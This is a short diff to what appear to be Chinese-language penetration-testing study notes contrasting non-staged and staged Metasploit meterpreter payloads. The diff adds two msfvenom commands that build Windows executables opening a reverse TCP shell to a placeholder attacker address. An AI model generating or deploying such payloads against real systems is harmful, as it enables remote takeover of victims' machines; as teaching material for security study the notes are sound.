@@ -6,7 +6,15 @@
 直接在記憶體中呼叫 執行完整的Payload
 通常送過去的Payload 大小較大
 Ex: windows/meterpreter_reverse_tcp
+##### 產生一個 exe
+```
+msfvenom -p windows/meterpreter_reverse_tcp LHOST=x.x.x.x LPORT=x -f exe -o non-staged.exe
+```
 #### Staged Payload (有階段性)
 只送一小段 Payload 做接應
 較穩定，且有其他功能
 Ex: windows/meterpreter/reverse_tcp
+##### 產生一個 exe
+```
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=x -f exe -o staged.exe
+```
